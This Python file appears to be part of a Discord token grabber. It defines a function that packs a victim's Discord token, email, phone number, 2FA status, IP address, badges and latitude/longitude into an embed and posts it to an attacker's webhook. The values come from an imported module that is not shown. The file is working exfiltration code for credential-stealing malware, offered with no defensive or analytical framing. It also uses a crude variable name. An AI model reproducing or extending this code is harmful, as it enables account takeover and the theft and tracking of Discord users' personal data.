from z.rnd import *
from requests import post

def Discord(webhook):
    Info = {
        "content": f'',
        "embeds": [
            {
            "color": 2303786,
            "fields": [  
                {
                    "name": "Id:",
                    "value": f"`{tokenid}`",
                    "inline": True
                },
                {
                    "name": "Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "Phone:",
                    "value": f"`{phone}`",
                    "inline": True
                },
                {
                    "name": "2fa:",
                    "value": f"`{gay}`",
                    "inline": True
                },
                {
                    "name": "Ip:",
                    "value": f"`{ipfake}`",
                    "inline": True
                },
                {
                    "name": "Badges:",
                    "value": f"{comunbadge}{rarebadge}",
                    "inline": True
                },
                                    {
                    "name": "Latitud - Longitud:",
                    "value": f"`{latitud} {longitud}`",
                    "inline": True
                },
                {
                    "name": "Token:",
                    "value": f"```{token}```",
                }
                ],
            "author": {
                "name": f"{user}#{tag}",
                "icon_url": f"{pfpembed}"
            },
            "footer": {
                "text": f"{oembed} · Discord Information · {vbv}",
                "icon_url": f"{pfpembed}"
                },
            "thumbnail": {}
            }
        ],
        "avatar_url": f"{pfpembed}",
        "username": f"{oembed}",
        "attachments": []
        }
    post(webhook,json=Info)
